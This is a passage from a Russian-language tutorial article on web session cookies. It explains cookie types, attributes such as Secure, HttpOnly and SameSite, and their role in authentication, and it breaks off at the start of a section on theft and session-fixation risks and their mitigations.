<article class="markdown-body entry-content container-lg" itemprop="text">
 <ul dir="auto">
  <li>
   <a href="#steal-web-session-cookie">
    Steal Web Session Cookie
   </a>
   <ul dir="auto">
    <li>
     <a href="#%D0%B2%D0%B2%D0%B5%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5">
      Введение
     </a>
    </li>
    <li>
     <a href="#%D1%87%D1%82%D0%BE-%D1%82%D0%B0%D0%BA%D0%BE%D0%B5-%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%BE%D0%BD%D0%BD%D1%8B%D0%B5-cookie">
      Что
                        такое сессионные cookie?
     </a>
     <ul dir="auto">
      <li>
       <a href="#%D0%BE%D0%BF%D1%80%D0%B5%D0%B4%D0%B5%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-cookie">
        Определение
                                cookie
       </a>
      </li>
      <li>
       <a href="#%D1%80%D0%B0%D0%B7%D0%BB%D0%B8%D1%87%D0%B8%D0%B5-%D0%BC%D0%B5%D0%B6%D0%B4%D1%83-%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%BE%D0%BD%D0%BD%D1%8B%D0%BC%D0%B8-%D0%B8-%D0%BF%D0%BE%D1%81%D1%82%D0%BE%D1%8F%D0%BD%D0%BD%D1%8B%D0%BC%D0%B8-cookie">
        Различие
                                между сессионными и постоянными cookie
       </a>
       <ul dir="auto">
        <li>
         <a href="#%D0%BF%D1%80%D0%B5%D0%B8%D0%BC%D1%83%D1%89%D0%B5%D1%81%D1%82%D0%B2%D0%B0-%D0%B8-%D0%BD%D0%B5%D0%B4%D0%BE%D1%81%D1%82%D0%B0%D1%82%D0%BA%D0%B8">
          Преимущества
                                        и недостатки
         </a>
        </li>
        <li>
         <a href="#%D1%82%D0%B5%D1%85%D0%BD%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%B8%D0%B5-%D1%80%D0%B0%D0%B7%D0%BB%D0%B8%D1%87%D0%B8%D1%8F">
          Технические
                                        различия
         </a>
        </li>
        <li>
         <a href="#%D0%BA%D0%BE%D0%B3%D0%B4%D0%B0-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D1%8C-%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%BE%D0%BD%D0%BD%D1%8B%D0%B5-%D0%B8-%D0%BF%D0%BE%D1%81%D1%82%D0%BE%D1%8F%D0%BD%D0%BD%D1%8B%D0%B5-cookie">
          Когда
                                        использовать сессионные и постоянные cookie?
         </a>
        </li>
       </ul>
      </li>
      <li>
       <a href="#%D1%81%D1%82%D1%80%D1%83%D0%BA%D1%82%D1%83%D1%80%D0%B0-cookie">
        Структура
                                cookie
       </a>
       <ul dir="auto">
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B9-%D1%81%D1%82%D1%80%D1%83%D0%BA%D1%82%D1%83%D1%80%D1%8B-cookie">
          Пример
                                        полной структуры cookie
         </a>
        </li>
       </ul>
      </li>
      <li>
       <a href="#%D1%80%D0%BE%D0%BB%D1%8C-cookie-%D0%B2-%D0%B0%D1%83%D1%82%D0%B5%D0%BD%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D0%B8-%D0%B8-%D0%B0%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D0%B8">
        Роль
                                cookie в аутентификации и авторизации
       </a>
       <ul dir="auto">
        <li>
         <a href="#%D0%BF%D1%80%D0%B5%D0%B8%D0%BC%D1%83%D1%89%D0%B5%D1%81%D1%82%D0%B2%D0%B0-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-cookie-%D0%B2-%D0%B0%D1%83%D1%82%D0%B5%D0%BD%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D0%B8-%D0%B8-%D0%B0%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D0%B8">
          Преимущества
                                        использования cookie в аутентификации и авторизации
         </a>
        </li>
        <li>
         <a href="#%D1%80%D0%B8%D1%81%D0%BA%D0%B8-%D0%B8-%D0%BC%D0%B5%D1%80%D1%8B-%D0%BF%D1%80%D0%B5%D0%B4%D0%BE%D1%81%D1%82%D0%BE%D1%80%D0%BE%D0%B6%D0%BD%D0%BE%D1%81%D1%82%D0%B8">
          Риски
                                        и меры предосторожности
         </a>
        </li>
       </ul>
      </li>
     </ul>
    </li>
    <li>
     <a href="#%D0%BA%D0%B0%D0%BA-%D0%B7%D0%BB%D0%BE%D1%83%D0%BC%D1%8B%D1%88%D0%BB%D0%B5%D0%BD%D0%BD%D0%B8%D0%BA%D0%B8-%D0%BC%D0%BE%D0%B3%D1%83%D1%82-%D1%83%D0%BA%D1%80%D0%B0%D1%81%D1%82%D1%8C-%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%BE%D0%BD%D0%BD%D1%8B%D0%B5-cookie">
      Как
                        злоумышленники могут украсть сессионные cookie?
     </a>
     <ul dir="auto">
      <li>
       <a href="#xss-cross-site-scripting">
        XSS (Cross-Site Scripting)
       </a>
       <ul dir="auto">
        <li>
         <a href="#%D0%BA%D0%B0%D0%BA-%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D0%B9-%D1%81%D0%BA%D1%80%D0%B8%D0%BF%D1%82-%D0%BC%D0%BE%D0%B6%D0%B5%D1%82-%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B8%D1%82%D1%8C-%D0%B4%D0%BE%D1%81%D1%82%D1%83%D0%BF-%D0%BA-cookie">
          Как
                                        вредоносный скрипт может получить доступ к cookie?
         </a>
        </li>
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-%D1%81%D1%86%D0%B5%D0%BD%D0%B0%D1%80%D0%B8%D1%8F-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8">
          Пример
                                        сценария атаки
         </a>
        </li>
        <li>
         <a href="#%D0%BA%D0%B0%D0%BA-%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B8%D1%82%D1%8C%D1%81%D1%8F-%D0%BE%D1%82-xss">
          Как
                                        защититься от XSS?
         </a>
        </li>
       </ul>
      </li>
      <li>
       <a href="#%D1%81%D0%BD%D0%B8%D1%84%D1%84%D0%B8%D0%BD%D0%B3-%D1%82%D1%80%D0%B0%D1%84%D0%B8%D0%BA%D0%B0">
        Сниффинг
                                трафика
       </a>
       <ul dir="auto">
        <li>
         <a href="#%D1%83%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D1%8C-%D0%BF%D1%80%D0%B8-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B8-http-%D0%B2%D0%BC%D0%B5%D1%81%D1%82%D0%BE-https">
          Уязвимость
                                        при использовании HTTP вместо HTTPS
         </a>
        </li>
        <li>
         <a href="#%D0%BA%D0%B0%D0%BA-cookie-%D0%BC%D0%BE%D0%B3%D1%83%D1%82-%D0%B1%D1%8B%D1%82%D1%8C-%D0%BF%D0%B5%D1%80%D0%B5%D1%85%D0%B2%D0%B0%D1%87%D0%B5%D0%BD%D1%8B-%D0%B2-%D0%BE%D1%82%D0%BA%D1%80%D1%8B%D1%82%D1%8B%D1%85-%D1%81%D0%B5%D1%82%D1%8F%D1%85">
          Как
                                        cookie могут быть перехвачены в открытых сетях?
         </a>
        </li>
        <li>
         <a href="#%D0%BA%D0%B0%D0%BA-%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B8%D1%82%D1%8C%D1%81%D1%8F-%D0%BE%D1%82-%D1%81%D0%BD%D0%B8%D1%84%D1%84%D0%B8%D0%BD%D0%B3%D0%B0-%D1%82%D1%80%D0%B0%D1%84%D0%B8%D0%BA%D0%B0">
          Как
                                        защититься от сниффинга трафика?
         </a>
        </li>
       </ul>
      </li>
      <li>
       <a href="#%D1%81%D0%BE%D1%86%D0%B8%D0%B0%D0%BB%D1%8C%D0%BD%D0%B0%D1%8F-%D0%B8%D0%BD%D0%B6%D0%B5%D0%BD%D0%B5%D1%80%D0%B8%D1%8F">
        Социальная
                                инженерия
       </a>
       <ul dir="auto">
        <li>
         <a href="#%D1%84%D0%B8%D1%88%D0%B8%D0%BD%D0%B3-%D0%B8-%D0%BE%D0%B1%D0%BC%D0%B0%D0%BD-%D0%B4%D0%BB%D1%8F-%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B5%D0%BD%D0%B8%D1%8F-cookie">
          Фишинг
                                        и обман для получения cookie
         </a>
        </li>
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-%D1%81%D1%86%D0%B5%D0%BD%D0%B0%D1%80%D0%B8%D1%8F-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8-1">
          Пример
                                        сценария атаки
         </a>
        </li>
        <li>
         <a href="#%D0%BA%D0%B0%D0%BA-%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B8%D1%82%D1%8C%D1%81%D1%8F-%D0%BE%D1%82-%D1%84%D0%B8%D1%88%D0%B8%D0%BD%D0%B3%D0%B0">
          Как
                                        защититься от фишинга?
         </a>
        </li>
       </ul>
      </li>
      <li>
       <a href="#%D0%BA%D1%80%D0%B0%D0%B6%D0%B0-%D1%87%D0%B5%D1%80%D0%B5%D0%B7-%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D0%BE%D0%B5-%D0%BF%D0%BE">
        Кража
                                через вредоносное ПО
       </a>
       <ul dir="auto">
        <li>
         <a href="#%D0%BA%D0%B0%D0%BA-%D0%BB%D0%BE%D0%BA%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B5-cookie-%D0%BC%D0%BE%D0%B3%D1%83%D1%82-%D0%B1%D1%8B%D1%82%D1%8C-%D1%83%D0%BA%D1%80%D0%B0%D0%B4%D0%B5%D0%BD%D1%8B">
          Как
                                        локальные cookie могут быть украдены?
         </a>
        </li>
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-%D1%81%D1%86%D0%B5%D0%BD%D0%B0%D1%80%D0%B8%D1%8F-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8-2">
          Пример
                                        сценария атаки
         </a>
        </li>
        <li>
         <a href="#%D0%BA%D0%B0%D0%BA-%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B8%D1%82%D1%8C%D1%81%D1%8F-%D0%BE%D1%82-%D0%BA%D1%80%D0%B0%D0%B6%D0%B8-%D1%87%D0%B5%D1%80%D0%B5%D0%B7-%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D0%BE%D0%B5-%D0%BF%D0%BE">
          Как
                                        защититься от кражи через вредоносное ПО?
         </a>
        </li>
       </ul>
      </li>
     </ul>
    </li>
    <li>
     <a href="#%D0%B7%D0%B0%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5">
      Заключение
     </a>
    </li>
    <li>
     <a href="#%D0%B4%D0%BE%D0%BF%D0%BE%D0%BB%D0%BD%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D1%8B%D0%B5-%D0%BC%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%D1%8B">
      Дополнительные
                        материалы
     </a>
     <ul dir="auto">
      <li>
       <a href="#%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B8-%D0%BD%D0%B0-%D0%BE%D1%84%D0%B8%D1%86%D0%B8%D0%B0%D0%BB%D1%8C%D0%BD%D1%83%D1%8E-%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%B0%D1%86%D0%B8%D1%8E">
        Ссылки
                                на официальную документацию
       </a>
      </li>
      <li>
       <a href="#%D1%80%D0%B5%D0%BA%D0%BE%D0%BC%D0%B5%D0%BD%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%BD%D1%8B%D0%B5-%D0%B8%D0%BD%D1%81%D1%82%D1%80%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D1%8B-%D0%B4%D0%BB%D1%8F-%D1%82%D0%B5%D1%81%D1%82%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D0%B8">
        Рекомендованные
                                инструменты для тестирования безопасности
       </a>
      </li>
      <li>
       <a href="#%D1%81%D1%82%D0%B0%D1%82%D1%8C%D0%B8-%D0%B8-%D0%BA%D0%BD%D0%B8%D0%B3%D0%B8-%D0%BF%D0%BE-%D0%B2%D0%B5%D0%B1-%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D0%B8">
        Статьи
                                и книги по веб-безопасности
       </a>
      </li>
     </ul>
    </li>
   </ul>
  </li>
 </ul>
 <div class="markdown-heading" dir="auto">
  <h1 class="heading-element" dir="auto" tabindex="-1">
   Steal Web Session Cookie
  </h1>
 </div>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Введение
  </h2>
 </div>
 <p dir="auto">
  Веб-сессии и cookie являются основными инструментами для управления состоянием в веб-приложениях. Они
        позволяют серверам идентифицировать пользователей, сохранять их данные и обеспечивать персонализированный опыт.
        Однако, несмотря на их удобство, неправильное использование или недостаточная защита могут привести к серьезным
        проблемам безопасности.
 </p>
 <p dir="auto">
  Сессии помогают преодолеть ограничения протокола HTTP, который не сохраняет состояние между запросами.
        Cookie, в свою очередь, служат средством передачи данных между клиентом и сервером, включая идентификаторы
        сессий. Эти механизмы широко используются для авторизации, персонализации и других задач, связанных с
        взаимодействием пользователя и веб-приложения.
 </p>
 <p dir="auto">
  В данной статье мы рассмотрим, как работают сессии и cookie, их роль в веб-приложениях, а также
        основные угрозы безопасности и способы защиты.
 </p>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Что такое сессионные cookie?
  </h2>
 </div>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Определение cookie
  </h3>
 </div>
 <p dir="auto">
  Cookie — это небольшие текстовые файлы, которые веб-сервер отправляет браузеру пользователя. Они
        хранятся на устройстве пользователя и используются для передачи данных между клиентом и сервером. Cookie
        позволяют веб-приложениям сохранять информацию о пользователе, такую как настройки, предпочтения или
        идентификаторы сессий.
 </p>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Различие между сессионными и постоянными cookie
  </h3>
 </div>
 <p dir="auto">
  Cookie делятся на два основных типа: сессионные и постоянные. Они различаются по времени хранения,
        назначению и способу использования.
 </p>
 <ul dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Сессионные cookie
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Хранятся только в течение текущей сессии браузера.
    </li>
    <li>
     Удаляются автоматически, как только пользователь закрывает браузер.
    </li>
    <li>
     Используются для временного хранения данных, таких как session ID, которые необходимы для работы
                    веб-приложения.
    </li>
    <li>
     Пример использования:
     <ul dir="auto">
      <li>
       Авторизация пользователя на сайте. Сессионные cookie позволяют серверу идентифицировать
                            пользователя до тех пор, пока он не закроет браузер.
      </li>
      <li>
       Сохранение содержимого корзины покупок в интернет-магазине на время текущей сессии.
      </li>
     </ul>
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Постоянные cookie
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Хранятся на устройстве пользователя в течение определенного времени, указанного в параметре
     <code>
      Expires
     </code>
     или
     <code>
      Max-Age
     </code>
     .
    </li>
    <li>
     Сохраняются даже после закрытия браузера.
    </li>
    <li>
     Используются для хранения данных, таких как настройки пользователя, предпочтения или информация для
                    автоматического входа.
    </li>
    <li>
     Пример использования:
     <ul dir="auto">
      <li>
       Запоминание языка интерфейса, выбранного пользователем.
      </li>
      <li>
       Автоматический вход в учетную запись при повторном посещении сайта.
      </li>
     </ul>
    </li>
   </ul>
  </li>
 </ul>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Преимущества и недостатки
  </h4>
 </div>
 <markdown-accessiblity-table data-catalyst="">
  <table>
   <thead>
    <tr>
     <th>
      Тип Cookie
     </th>
     <th>
      Преимущества
     </th>
     <th>
      Недостатки
     </th>
    </tr>
   </thead>
   <tbody>
    <tr>
     <td>
      Сессионные
     </td>
     <td>
      - Простота использования.
     </td>
     <td>
      - Данные теряются после закрытия браузера.
     </td>
    </tr>
    <tr>
     <td>
     </td>
     <td>
      - Меньший риск утечки данных, так как они не сохраняются на устройстве.
     </td>
     <td>
     </td>
    </tr>
    <tr>
     <td>
      Постоянные
     </td>
     <td>
      - Удобство для пользователя (например, автоматический вход).
     </td>
     <td>
      - Более высокий риск утечки данных, так как они хранятся на устройстве.
     </td>
    </tr>
    <tr>
     <td>
     </td>
     <td>
      - Возможность персонализации интерфейса и сохранения предпочтений.
     </td>
     <td>
      - Требуют более тщательной настройки для обеспечения безопасности.
     </td>
    </tr>
   </tbody>
  </table>
 </markdown-accessiblity-table>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Технические различия
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Срок действия
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Для сессионных cookie срок действия не указывается, и они удаляются при закрытии браузера.
    </li>
    <li>
     Для постоянных cookie срок действия задается с помощью параметра
     <code>
      Expires
     </code>
     или
     <code>
      Max-Age
     </code>
     . Например:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Set-Cookie: user_pref=dark_mode; Expires=Wed, 21 Oct 2023 07:28:00 GMT
    </code></pre>
     </div>
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Область действия
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Оба типа cookie могут быть ограничены определенным доменом или путем с помощью параметра
     <code>
      Domain
     </code>
     и
     <code>
      Path
     </code>
     . Например:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Set-Cookie: session_id=abc123; Path=/; Domain=example.com
    </code></pre>
     </div>
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Безопасность
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Постоянные cookie требуют дополнительных мер безопасности, таких как установка флагов
     <code>
      HttpOnly
     </code>
     и
     <code>
      Secure
     </code>
     , чтобы минимизировать риск их кражи.
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Когда использовать сессионные и постоянные cookie?
  </h4>
 </div>
 <ul dir="auto">
  <li>
   <p dir="auto">
    Используйте
    <strong>
     сессионные cookie
    </strong>
    , если данные нужны только на время текущей
                сессии пользователя. Например:
   </p>
   <ul dir="auto">
    <li>
     Для отслеживания состояния входа пользователя.
    </li>
    <li>
     Для временного сохранения данных формы.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    Используйте
    <strong>
     постоянные cookie
    </strong>
    , если данные должны сохраняться между сессиями.
                Например:
   </p>
   <ul dir="auto">
    <li>
     Для запоминания предпочтений пользователя, таких как язык или тема интерфейса.
    </li>
    <li>
     Для автоматического входа в систему при повторном посещении сайта.
    </li>
   </ul>
  </li>
 </ul>
 <p dir="auto">
  Понимание различий между сессионными и постоянными cookie позволяет разработчикам выбирать подходящий
        тип для каждой задачи, обеспечивая удобство и безопасность пользователей.
 </p>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Структура cookie
  </h3>
 </div>
 <p dir="auto">
  Cookie состоят из нескольких компонентов, которые определяют их поведение, область действия и
        безопасность. Рассмотрим основные элементы структуры cookie:
 </p>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Ключ-значение
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Основной компонент cookie — это пара ключ-значение, которая хранит данные.
    </li>
    <li>
     Пример:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>session_id=abc123
    </code></pre>
     </div>
    </li>
    <li>
     Здесь
     <code>
      session_id
     </code>
     — это ключ, а
     <code>
      abc123
     </code>
     — значение.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Domain (домен)
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Указывает, для какого домена cookie действительны.
    </li>
    <li>
     Пример:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Domain=example.com
    </code></pre>
     </div>
    </li>
    <li>
     Cookie с этим параметром будут отправляться только на серверы домена
     <code>
      example.com
     </code>
     .
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Path (путь)
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Определяет, для каких путей на сервере cookie будут отправляться.
    </li>
    <li>
     Пример:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Path=/dashboard
    </code></pre>
     </div>
    </li>
    <li>
     Cookie будут отправляться только для запросов, начинающихся с
     <code>
      /dashboard
     </code>
     .
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Expires и Max-Age (срок действия)
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Указывают, как долго cookie будут храниться.
    </li>
    <li>
     <code>
      Expires
     </code>
     задает точную дату и время истечения срока действия:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Expires=Wed, 21 Oct 2023 07:28:00 GMT
    </code></pre>
     </div>
    </li>
    <li>
     <code>
      Max-Age
     </code>
     задает время жизни в секундах:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Max-Age=3600
    </code></pre>
     </div>
    </li>
    <li>
     Если срок действия не указан, cookie считаются сессионными и удаляются при закрытии браузера.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Secure (безопасность)
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Указывает, что cookie должны передаваться только через защищенное соединение (HTTPS).
    </li>
    <li>
     Пример:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Secure
    </code></pre>
     </div>
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     HttpOnly
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Запрещает доступ к cookie через JavaScript, что защищает их от XSS-атак.
    </li>
    <li>
     Пример:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>HttpOnly
    </code></pre>
     </div>
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     SameSite
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Определяет, будут ли cookie отправляться с запросами на сторонние сайты.
    </li>
    <li>
     Возможные значения:
     <ul dir="auto">
      <li>
       <code>
        Strict
       </code>
       — cookie отправляются только с запросами на тот же сайт.
      </li>
      <li>
       <code>
        Lax
       </code>
       — cookie отправляются с запросами на тот же сайт и с переходами по ссылкам.
      </li>
      <li>
       <code>
        None
       </code>
       — cookie отправляются со всеми запросами (требует флага
       <code>
        Secure
       </code>
       ).
      </li>
     </ul>
    </li>
    <li>
     Пример:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>SameSite=Strict
    </code></pre>
     </div>
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример полной структуры cookie
  </h4>
 </div>
 <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
  <pre class="notranslate"><code>Set-Cookie: session_id=abc123; Domain=example.com; Path=/; Expires=Wed, 21 Oct 2023 07:28:00 GMT; Secure; HttpOnly; SameSite=Lax
    </code></pre>
 </div>
 <ul dir="auto">
  <li>
   <code>
    session_id=abc123
   </code>
   — ключ-значение.
  </li>
  <li>
   <code>
    Domain=example.com
   </code>
   — cookie действительны для домена
   <code>
    example.com
   </code>
   .
  </li>
  <li>
   <code>
    Path=/
   </code>
   — cookie отправляются для всех путей на сервере.
  </li>
  <li>
   <code>
    Expires=Wed, 21 Oct 2023 07:28:00 GMT
   </code>
   — срок действия cookie.
  </li>
  <li>
   <code>
    Secure
   </code>
   — cookie передаются только через HTTPS.
  </li>
  <li>
   <code>
    HttpOnly
   </code>
   — доступ к cookie через JavaScript запрещен.
  </li>
  <li>
   <code>
    SameSite=Lax
   </code>
   — cookie отправляются только с запросами на тот же сайт и с переходами по ссылкам.
  </li>
 </ul>
 <p dir="auto">
  Понимание структуры cookie позволяет разработчикам правильно настраивать их для обеспечения
        безопасности и удобства пользователей.
 </p>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Роль cookie в аутентификации и авторизации
  </h3>
 </div>
 <p dir="auto">
  Cookie играют ключевую роль в обеспечении безопасности и удобства работы пользователей в
        веб-приложениях. Они используются для хранения информации, необходимой для идентификации пользователя и
        управления его доступом к ресурсам.
 </p>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Аутентификация
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     После успешного входа пользователя сервер создает уникальный session ID и отправляет его клиенту в
                    виде cookie. Этот session ID связывается с учетной записью пользователя на сервере.
    </li>
    <li>
     При каждом последующем запросе браузер автоматически отправляет session ID серверу, что позволяет
                    серверу идентифицировать пользователя без необходимости повторного ввода логина и пароля.
    </li>
    <li>
     Это особенно важно для приложений, где требуется поддерживать состояние пользователя, например, в
                    интернет-магазинах или системах управления контентом.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Авторизация
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Cookie используются для проверки прав доступа пользователя к определенным ресурсам или действиям.
                    Например:
     <ul dir="auto">
      <li>
       Пользователь с ролью "администратор" может иметь доступ к панели управления, в то время как
                            обычный пользователь — нет.
      </li>
      <li>
       Session ID может быть связан с ролями или уровнями доступа, которые проверяются сервером
                            перед выполнением запроса.
      </li>
     </ul>
    </li>
    <li>
     Пример сценария:
     <ul dir="auto">
      <li>
       Пользователь отправляет запрос на доступ к защищенному ресурсу.
      </li>
      <li>
       Сервер проверяет session ID в cookie и определяет, имеет ли пользователь необходимые права
                            доступа.
      </li>
     </ul>
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Дополнительные возможности
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Cookie могут использоваться для реализации функций "Запомнить меня", которые позволяют пользователю
                    оставаться авторизованным даже после закрытия браузера. Для этого используются постоянные cookie с
                    длительным сроком действия:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Set-Cookie: remember_me=xyz456; Expires=Wed, 21 Oct 2023 07:28:00 GMT; HttpOnly; Secure
    </code></pre>
     </div>
    </li>
    <li>
     Cookie также могут хранить токены доступа для интеграции с внешними сервисами, такими как API или
                    сторонние платформы.
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Преимущества использования cookie в аутентификации и
            авторизации
  </h4>
 </div>
 <ul dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Удобство для пользователя
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Пользователю не нужно вводить логин и пароль при каждом запросе.
    </li>
    <li>
     Возможность автоматического входа при повторном посещении сайта.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Эффективность для сервера
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Серверу не нужно хранить состояние пользователя в каждом запросе, так как session ID передается
                    через cookie.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Гибкость
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Cookie позволяют реализовать сложные сценарии авторизации, такие как управление ролями, временные
                    ограничения доступа и интеграция с внешними системами.
    </li>
   </ul>
  </li>
 </ul>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Риски и меры предосторожности
  </h4>
 </div>
 <ul dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Риск кражи cookie
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Если злоумышленник получит доступ к session ID, он сможет выдать себя за пользователя. Для
                    предотвращения этого рекомендуется использовать флаги
     <code>
      HttpOnly
     </code>
     и
     <code>
      Secure
     </code>
     , а
                    также шифрование данных через HTTPS.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Риск фиксации сессии
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Злоумышленник может попытаться использовать заранее известный session ID. Для защиты от этого
                    рекомендуется обновлять session ID после входа пользователя в систему.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Ограничение времени действия
